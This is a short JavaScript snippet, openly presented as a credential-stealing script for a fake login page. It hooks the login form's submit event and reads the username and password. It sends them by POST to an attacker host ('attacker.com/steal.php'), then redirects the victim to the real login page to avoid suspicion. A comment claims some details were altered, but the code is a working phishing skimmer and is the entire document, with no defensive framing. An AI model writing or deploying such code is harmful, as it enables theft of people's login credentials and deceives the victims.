<script>
// In this script we captures the victim's username and password when they attempt to log in, then redirects them to the legitimate login page to avoid suspicion.
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://attacker.com/steal.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
        // Redirect the user to the legitimate login page
        window.location.href = 'http://legit-site.com/login';
    });
// For security reasons ive changed some keypoints aswell as url, ext etc.    
</script>